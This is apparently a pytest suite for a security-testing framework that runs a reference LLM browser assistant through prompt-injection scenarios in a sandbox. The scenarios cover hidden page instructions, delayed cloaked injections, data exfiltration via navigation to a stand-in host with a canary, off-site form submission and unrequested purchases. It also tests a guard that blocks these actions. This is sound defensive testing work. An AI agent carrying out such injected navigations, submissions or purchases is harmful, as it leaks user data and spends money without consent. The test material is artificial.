"""Reference LLM-powered browser assistant
(examples/real_world_agents/llm_browser_assistant/).

Same two-tier structure as the email assistant's tests:

* **Deterministic CI tests**: the backend is a `ScriptedBackend` -- a recorded test double, NOT a
  model. They test the assistant's plumbing (multi-step execution, session isolation/reset, the
  hardened guard, the HTTP contract) and AgentSec's pipeline (delivery, attack goals, verdicts for
  navigation / form submission / purchase). A FINDINGS verdict here says the pipeline reports a
  tool call correctly; it says nothing about any real model.
* **Live-model tests** (`TestLiveModel`): skipped unless a real backend is configured. Their
  verdict is recorded, not asserted (except the deterministic hardened guard).
"""
import importlib.util
import json
import os
import socket
import sys
import threading
from pathlib import Path

import pytest

from agentsec.adapters import CallableAdapter, HTTPAgentAdapter
from agentsec.attacks.base import ScenarioContext
from agentsec.evaluators import evaluate_trace
from agentsec.evaluators.goals import _decoded, _norm, payload_delivery
from agentsec.policies import parse_policy
from agentsec.runners.local import ScenarioResult, run_scenario

_ROOT = Path(__file__).resolve().parent.parent
_ASSISTANT = _ROOT / "examples" / "real_world_agents" / "llm_browser_assistant" / "server.py"
_POLICY_PATH = _ROOT / "examples" / "attack_packs" / "browser_agent.agentsec.yaml"


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, str(path))
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


ba = _load("browser_assistant_under_test", _ASSISTANT)
llm = ba.llm
pack = ba.pack
POLICY_TEXT = _POLICY_PATH.read_text()
POLICY = parse_policy(POLICY_TEXT)
SLOTS = tuple(sorted(v for k, v in vars(pack).items() if "_SLOT" in k and isinstance(v, str)))

ACCOUNT_URL = pack.ACCOUNT_URL
PRODUCT_URL = pack.PRODUCT_URL


def _scenarios():
    ctx = ScenarioContext(POLICY, 0)
    out = {}
    for build in (pack.build_nav_exfiltration, pack.build_unauthorized_navigation,
                  pack.build_unauthorized_form_submission, pack.build_unauthorized_purchase,
                  pack.build_delayed_page_injection):
        for sc in build(ctx):
            out[sc.id] = sc
    return out


def _delivered(bodies):
    return any(_norm(s) in _norm(b) or (_decoded(b) and _norm(s) in _decoded(b))
               for b in bodies for s in SLOTS)


# ---------------------------------------------------------------------------
# Recorded LLM stand-ins (NOT models)
# ---------------------------------------------------------------------------

def _seen(messages):
    read, bodies, names = [], [], []
    for m in messages:
        if m.get("role") == "assistant":
            for tc in m.get("tool_calls") or []:
                fn = tc.get("function") or {}
                names.append(fn.get("name"))
                if fn.get("name") in ("read_page", "fetch_page"):
                    try:
                        read.append(json.loads(fn.get("arguments") or "{}").get("url"))
                    except ValueError:
                        pass
        if m.get("role") == "tool":
            bodies.append(m.get("content") or "")
    return read, bodies, names


def browse_then(action, reads=3):
    """Read the account page and the product page (re-reading the product up to `reads` times to
    reach a cloaked injection), then take `action` (a ToolRequest) once after delivery. `action`
    may be a callable (bodies) -> ToolRequest for scenarios that choose per content, or None."""
    def decide(system, messages, tools):
        read, bodies, names = _seen(messages)
        if not any(m.get("role") == "assistant" for m in messages):
            return llm.Decision(tool_calls=[llm.ToolRequest("read_page", {"url": ACCOUNT_URL})])
        if ACCOUNT_URL not in read:
            return llm.Decision(tool_calls=[llm.ToolRequest("read_page", {"url": ACCOUNT_URL})])
        if PRODUCT_URL not in read:
            return llm.Decision(tool_calls=[llm.ToolRequest("read_page", {"url": PRODUCT_URL})])
        delivered = _delivered(bodies)
        if not delivered and read.count(PRODUCT_URL) < reads:
            return llm.Decision(tool_calls=[llm.ToolRequest("read_page", {"url": PRODUCT_URL})])
        act = action(bodies) if callable(action) else action
        sink_names = {"navigate", "submit_form", "fill_form", "place_order"}
        if act is not None and delivered and not (sink_names & set(names)):
            return llm.Decision(tool_calls=[act])
        return llm.Decision(content="Summary complete.")
    return decide


NAVIGATE_EXFIL = llm.ToolRequest("navigate", {"url": "https://%s/collect?ref=%s"
                                              % (pack.EXFIL_HOST, pack.BROWSER_CANARY)})
NAVIGATE_OFFSITE = llm.ToolRequest("navigate", {"url": "https://%s/item/42" % pack.OFFERS_HOST})
SUBMIT_OFFSITE = llm.ToolRequest("submit_form", {"url": "https://%s/intake" % pack.EXFIL_HOST,
                                                 "fields": {"ref": pack.BROWSER_CANARY}})
PLACE_ORDER = llm.ToolRequest("place_order", {"sku": pack.ATTACK_SKU, "quantity": 1})


def assistant(decide, hardened=False, execute_tools=False, **kw):
    return ba.BrowserAssistant(llm.ScriptedBackend(decide), hardened=hardened,
                               execute_tools=execute_tools, **kw)


def _adapter(a):
    def fn(messages, tools, session=None):
        reply = a.handle(messages, tools, session or "s1")
        return {"content": reply.get("content"),
                "tool_calls": [{"id": tc["id"], "name": tc["function"]["name"],
                                "arguments": json.loads(tc["function"]["arguments"])}
                               for tc in reply.get("tool_calls") or []]}
    return CallableAdapter(fn)


def _run(scenario, a):
    trace = run_scenario(scenario, POLICY, _adapter(a))
    return ScenarioResult(scenario, trace, evaluate_trace(scenario, trace, POLICY))


# ---------------------------------------------------------------------------
# Unit: the simulated browser tools through the assistant's executor
# ---------------------------------------------------------------------------

def test_executor_runs_every_browser_tool():
    state = ba.SessionState()
    page = json.loads(ba.execute(llm.ToolRequest("read_page", {"url": PRODUCT_URL}), state))
    assert page["url"] == PRODUCT_URL and "reviews" in page
    assert "simulated" in json.loads(ba.execute(llm.ToolRequest("navigate", {"url": "https://x.invalid"}), state))["status"]
    assert "simulated" in json.loads(ba.execute(llm.ToolRequest("submit_form", {"url": "https://x.invalid"}), state))["status"]
    assert "simulated" in json.loads(ba.execute(llm.ToolRequest("place_order", {"sku": "SKU-1"}), state))["status"]
    snap = state.sim.snapshot()
    assert snap["navigations"] and snap["forms"] and snap["orders"]


def test_executor_rejects_unknown_tool():
    assert json.loads(ba.execute(llm.ToolRequest("hack", {}), ba.SessionState()))["error"]


def test_assistant_declares_the_browser_tools_when_caller_declares_none():
    names = [t["function"]["name"] for t in ba.tool_definitions()]
    assert set(names) == set(ba.BROWSER_TOOLS) - {"fetch_page"}


# ---------------------------------------------------------------------------
# Unit: hardened guard
# ---------------------------------------------------------------------------

def test_guard_allows_reads_and_first_party_navigation():
    msgs = [{"role": "user", "content": "look at this page"}]
    assert ba.guard_verdict(llm.ToolRequest("read_page", {"url": PRODUCT_URL}), msgs) is None
    assert ba.guard_verdict(llm.ToolRequest("navigate", {"url": PRODUCT_URL}), msgs) is None


def test_guard_blocks_navigation_to_unnamed_host():
    msgs = [{"role": "user", "content": "look at this page"}]
    assert ba.guard_verdict(NAVIGATE_EXFIL, msgs) is not None
    assert ba.guard_verdict(NAVIGATE_OFFSITE, msgs) is not None


def test_guard_allows_navigation_to_a_host_the_user_named():
    msgs = [{"role": "user", "content": "go to https://offers.external-unseen.invalid/item/42"}]
    assert ba.guard_verdict(NAVIGATE_OFFSITE, msgs) is None


def test_guard_blocks_offsite_form_submission():
    msgs = [{"role": "user", "content": "summarize the returns page"}]
    assert ba.guard_verdict(SUBMIT_OFFSITE, msgs) is not None


def test_guard_blocks_purchase_the_user_did_not_request_and_allows_one_they_did():
    msgs = [{"role": "user", "content": "just summarize"}]
    assert ba.guard_verdict(PLACE_ORDER, msgs) is not None
    named = [{"role": "user", "content": "please order %s for me" % pack.ATTACK_SKU}]
    assert ba.guard_verdict(PLACE_ORDER, named) is None


def test_apply_guard_drops_refused_calls_and_explains():
    msgs = [{"role": "user", "content": "look at this page"}]
    out = ba.apply_guard(llm.Decision(tool_calls=[NAVIGATE_EXFIL]), msgs)
    assert out.tool_calls == [] and out.blocked and "navigate refused" in out.blocked[0]


# ---------------------------------------------------------------------------
# Session isolation and reset
# ---------------------------------------------------------------------------

def test_sessions_are_isolated():
    store = ba.SessionStore()
    a, b = store.get("a"), store.get("b")
    assert a is not b
    ba.execute(llm.ToolRequest("place_order", {"sku": "SKU-1"}), a)
    assert a.sim.snapshot()["orders"] and b.sim.snapshot()["orders"] == []


def test_new_conversation_resets_session():
    a = assistant(browse_then(None))
    state = a.sessions.get("s1")
    ba.execute(llm.ToolRequest("navigate", {"url": "https://x.invalid"}), state)
    assert state.sim.snapshot()["navigations"]
    a.handle([{"role": "user", "content": "look at this page"}], [], "s1")
    assert a.sessions.get("s1").sim.snapshot()["navigations"] == []


def test_midconversation_does_not_reset():
    a = assistant(browse_then(None))
    state = a.sessions.get("s1")
    ba.execute(llm.ToolRequest("navigate", {"url": "https://x.invalid"}), state)
    a.handle([{"role": "user", "content": "look"}, {"role": "assistant", "content": "ok"}], [], "s1")
    assert a.sessions.get("s1").sim.snapshot()["navigations"]


# ---------------------------------------------------------------------------
# Multi-step execution and x_agentsec events
# ---------------------------------------------------------------------------

def test_self_executing_mode_runs_multi_step_and_reports_events():
    a = assistant(browse_then(None), execute_tools=True)
    reply = a.handle([{"role": "user", "content": "summarize both pages"}], [], "s1")
    events = reply["_events"]
    assert len(events) >= 2 and events[0]["name"] == "read_page"
    assert all(e["name"] in ba.BROWSER_TOOLS for e in events)
    assert all(e.get("result") for e in events)
    assert reply["tool_calls"] == []


def test_self_executing_respects_step_budget():
    forever = lambda system, messages, tools: llm.Decision(
        tool_calls=[llm.ToolRequest("read_page", {"url": PRODUCT_URL})])
    a = assistant(forever, execute_tools=True, max_internal_steps=3)
    assert len(a.handle([{"role": "user", "content": "x"}], [], "s1")["_events"]) == 3


def test_self_executed_calls_become_trace_events():
    a = assistant(browse_then(NAVIGATE_EXFIL), execute_tools=True)

    def fn(messages, tools, session=None):
        reply = a.handle(messages, tools, session or "s1")
        return {"content": reply["content"], "tool_calls": [],
                "executed": [{"name": e["name"], "arguments": e["arguments"], "result": e["result"]}
                             for e in reply["_events"]]}
    scenario = _scenarios()["browser_agent_data_exfiltration_via_navigation/reviews"]
    trace = run_scenario(scenario, POLICY, CallableAdapter(fn))
    assert "read_page" in [e.tool_name for e in trace.of_type("tool_call")]
    assert all((e.meta or {}).get("executed_by_agent") for e in trace.of_type("tool_call"))


# ---------------------------------------------------------------------------
# Sandbox pipeline: verdicts per action type
# ---------------------------------------------------------------------------

def test_positive_exfiltration_via_navigation_every_surface():
    surfaces = {sid: sc for sid, sc in _scenarios().items()
                if sid.startswith("browser_agent_data_exfiltration_via_navigation/")}
    assert len(surfaces) == 6
    for sid, scenario in surfaces.items():
        result = _run(scenario, assistant(browse_then(NAVIGATE_EXFIL)))
        assert result.status == "findings", sid
        goals = [f for f in result.findings if f.rule == "attack_goal_achieved"]
        assert goals and pack.EXFIL_HOST in goals[0].observed_action, sid


def test_positive_unauthorized_navigation():
    scenario = _scenarios()["browser_agent_unauthorized_navigation/moved_listing"]
    result = _run(scenario, assistant(browse_then(NAVIGATE_OFFSITE)))
    [g] = [f for f in result.findings if f.rule == "attack_goal_achieved"]
    assert pack.OFFERS_HOST in g.observed_action


def test_positive_unauthorized_form_submission():
    scenario = _scenarios()["browser_agent_unauthorized_form_submission/offsite_intake"]
    result = _run(scenario, assistant(browse_then(SUBMIT_OFFSITE)))
    assert any(f.rule == "attack_goal_achieved" for f in result.findings)


def test_positive_unauthorized_purchase():
    scenario = _scenarios()["browser_agent_unauthorized_purchase/unrequested_sku"]
    result = _run(scenario, assistant(browse_then(PLACE_ORDER)))
    [g] = [f for f in result.findings if f.rule == "attack_goal_achieved"]
    assert "place_order" in g.observed_action and pack.ATTACK_SKU in g.observed_action


def test_positive_delayed_injection_requires_reaching_the_cloaked_step():
    scenario = _scenarios()["browser_agent_delayed_page_injection/cloaked_after_views"]
    assert _run(scenario, assistant(browse_then(NAVIGATE_EXFIL))).status == "findings"


def test_finding_evidence_shows_delivery_before_action():
    scenario = _scenarios()["browser_agent_data_exfiltration_via_navigation/hidden"]
    result = _run(scenario, assistant(browse_then(NAVIGATE_EXFIL)))
    [g] = [f for f in result.findings if f.rule == "attack_goal_achieved"]
    seqs = [e["seq"] for e in g.evidence]
    assert len(seqs) == 2 and seqs[0] < seqs[1]
    assert result.trace.events[seqs[1]].type == "tool_call"


def test_negative_hardened_reaches_payload_and_is_not_flagged():
    actions = {
        "browser_agent_data_exfiltration_via_navigation/reviews": NAVIGATE_EXFIL,
        "browser_agent_unauthorized_navigation/moved_listing": NAVIGATE_OFFSITE,
        "browser_agent_unauthorized_form_submission/offsite_intake": SUBMIT_OFFSITE,
        "browser_agent_unauthorized_purchase/unrequested_sku": PLACE_ORDER,
        "browser_agent_delayed_page_injection/cloaked_after_views": NAVIGATE_EXFIL,
    }
    scs = _scenarios()
    for sid, act in actions.items():
        result = _run(scs[sid], assistant(browse_then(act), hardened=True))
        assert result.status == "passed", (sid, [f.rule for f in result.findings])
        assert payload_delivery(scs[sid], result.trace) is not None, ("not delivered", sid)


def test_negative_baseline_that_takes_no_action_passes():
    scenario = _scenarios()["browser_agent_data_exfiltration_via_navigation/body"]
    assert _run(scenario, assistant(browse_then(None))).status == "passed"


def test_inconclusive_when_agent_never_reads_the_product_page():
    account_only = lambda system, messages, tools: (
        llm.Decision(tool_calls=[llm.ToolRequest("read_page", {"url": ACCOUNT_URL})])
        if not any(m.get("role") == "assistant" for m in messages)
        else llm.Decision(content="Only looked at the account page."))
    for sid, scenario in _scenarios().items():
        result = _run(scenario, assistant(account_only))
        assert result.status == "inconclusive", sid
        assert result.findings == []


def test_inconclusive_when_backend_fails_is_not_a_pass():
    def boom(system, messages, tools):
        raise llm.BackendError("simulated outage")
    scenario = _scenarios()["browser_agent_data_exfiltration_via_navigation/body"]
    a = ba.BrowserAssistant(llm.ScriptedBackend(boom))

    def fn(messages, tools, session=None):
        a.handle(messages, tools, session or "s1")
    trace = run_scenario(scenario, POLICY, CallableAdapter(fn))
    result = ScenarioResult(scenario, trace, evaluate_trace(scenario, trace, POLICY))
    assert result.status == "error" and result.status != "passed"


# ---------------------------------------------------------------------------
# HTTP contract: real HTTPAgentAdapter against a live server
# ---------------------------------------------------------------------------

def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class _Served:
    def __init__(self, a):
        self.assistant = a

    def __enter__(self):
        self.port = _free_port()
        self.server = ba.make_server(self.assistant, port=self.port)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.policy = parse_policy(POLICY_TEXT.replace("127.0.0.1:8050", "127.0.0.1:%d" % self.port))
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()

    def run(self, scenario):
        trace = run_scenario(scenario, self.policy, HTTPAgentAdapter(self.policy.agent))
        return ScenarioResult(scenario, trace, evaluate_trace(scenario, trace, self.policy))


def test_http_end_to_end_baseline_is_flagged():
    scenario = _scenarios()["browser_agent_unauthorized_purchase/unrequested_sku"]
    with _Served(assistant(browse_then(PLACE_ORDER))) as served:
        result = served.run(scenario)
    assert result.status == "findings"
    assert "place_order" in [e.tool_name for e in result.trace.of_type("tool_call")]


def test_http_end_to_end_hardened_is_passed():
    scenario = _scenarios()["browser_agent_unauthorized_purchase/unrequested_sku"]
    with _Served(assistant(browse_then(PLACE_ORDER), hardened=True)) as served:
        result = served.run(scenario)
    assert result.status == "passed"
    assert "place_order" not in [e.tool_name for e in result.trace.of_type("tool_call")]


def test_http_backend_failure_is_an_errored_run():
    def boom(system, messages, tools):
        raise llm.BackendError("outage")
    scenario = _scenarios()["browser_agent_data_exfiltration_via_navigation/body"]
    with _Served(ba.BrowserAssistant(llm.ScriptedBackend(boom))) as served:
        result = served.run(scenario)
    assert result.status == "error" and "502" in (result.trace.error or "")


def test_http_malformed_request_is_rejected():
    import urllib.error
    import urllib.request
    with _Served(assistant(browse_then(None))) as served:
        req = urllib.request.Request("http://127.0.0.1:%d/agent" % served.port, data=b"{}",
                                     headers={"Content-Type": "application/json"}, method="POST")
        with pytest.raises(urllib.error.HTTPError) as exc:
            urllib.request.urlopen(req, timeout=5)
        assert exc.value.code == 400


# ---------------------------------------------------------------------------
# Pack shape preserved
# ---------------------------------------------------------------------------

def test_original_browser_categories_and_evaluator_preserved():
    from agentsec.attacks.packs import load_pack, load_pack_evaluators, load_pack_judge_checks
    spec = str(_ROOT / "examples" / "attack_packs" / "browser_agent_pack.py")
    cats = load_pack(spec)
    assert {"browser_agent_hidden_page_instruction", "browser_agent_lookalike_domain",
            "browser_agent_consent_trap"} <= set(cats)
    assert {"browser_agent_data_exfiltration_via_navigation",
            "browser_agent_unauthorized_navigation",
            "browser_agent_unauthorized_form_submission",
            "browser_agent_unauthorized_purchase",
            "browser_agent_delayed_page_injection"} <= set(cats)
    assert sorted(c.name for c in load_pack_evaluators(spec)) == ["browser_agent_lookalike_domain"]
    assert load_pack_judge_checks(spec) == {}


def test_every_injection_names_its_target_and_nothing_routable():
    import re
    exfil = [pack.EXFIL_VISIBLE_SLOT, pack.EXFIL_COMMENT_SLOT, pack.EXFIL_META_SLOT,
             pack.PAGE_INJECTION_SLOT, pack.EXFIL_ALT_SLOT, pack.EXFIL_REVIEW_SLOT,
             pack.FORM_SUBMIT_SLOT, pack.PAGE_INJECTION_SLOT_DELAYED]
    for inj in exfil:
        assert pack.EXFIL_HOST in inj
    assert pack.OFFERS_HOST in pack.NAV_OFFSITE_SLOT
    assert pack.ATTACK_SKU in pack.PURCHASE_SLOT
    for inj in exfil + [pack.NAV_OFFSITE_SLOT, pack.PURCHASE_SLOT]:
        for host in re.findall(r"https?://([\w.\-]+)", inj):
            assert host.endswith(".invalid"), host
        assert pack.BROWSER_CANARY not in inj   # the attack must make the agent fetch it


def test_every_scenario_states_technique_trust_boundary_and_goal():
    for sid, sc in _scenarios().items():
        assert "Technique:" in sc.description and "Trust boundary:" in sc.description, sid
        assert "Attack goal:" in sc.description and sc.attack_goals and sc.exposure, sid
        assert pack.EXFIL_HOST not in sc.user_message and pack.ATTACK_SKU not in sc.user_message, sid


# ---------------------------------------------------------------------------
# Live model (skipped unless configured)
# ---------------------------------------------------------------------------

class TestLiveModel:
    """The only tests that say anything about a real model. The baseline verdict is recorded, not
    asserted; the hardened guard is deterministic, so that assertion holds even with a live model.

        export AGENTSEC_LLM_BACKEND=anthropic
        export AGENTSEC_LLM_API_KEY=...
        export AGENTSEC_LLM_MODEL=claude-sonnet-4-5
        export AGENTSEC_RUN_LIVE_LLM=1
        pytest tests/test_browser_assistant_reference.py -k LiveModel -q -s
    """

    pytestmark = pytest.mark.skipif(
        not (llm.live_backend_configured() and os.environ.get("AGENTSEC_RUN_LIVE_LLM")),
        reason="no live LLM backend configured (set AGENTSEC_LLM_* and AGENTSEC_RUN_LIVE_LLM=1)")

    def _live(self, hardened):
        backend = llm.backend_from_env()
        assert backend is not None
        return ba.BrowserAssistant(backend, hardened=hardened)

    @pytest.mark.parametrize("scenario_id", sorted(_scenarios()))
    def test_live_baseline_records_verdict(self, scenario_id):
        scenario = _scenarios()[scenario_id]
        result = _run(scenario, self._live(hardened=False))
        delivered = payload_delivery(scenario, result.trace)
        print("\n[live baseline] %s model=%s verdict=%s delivered=%s calls=%s"
              % (scenario_id, os.environ.get("AGENTSEC_LLM_MODEL", "?"), result.status,
                 delivered is not None, [e.tool_name for e in result.trace.of_type("tool_call")]))
        assert result.status in ("findings", "passed", "inconclusive", "error")
        if result.status == "passed":
            assert delivered is not None, "passed without delivery must be inconclusive"

    @pytest.mark.parametrize("scenario_id", sorted(_scenarios()))
    def test_live_hardened_prevents_the_goal(self, scenario_id):
        scenario = _scenarios()[scenario_id]
        result = _run(scenario, self._live(hardened=True))
        print("\n[live hardened] %s verdict=%s" % (scenario_id, result.status))
        assert [f for f in result.findings if f.rule == "attack_goal_achieved"] == []
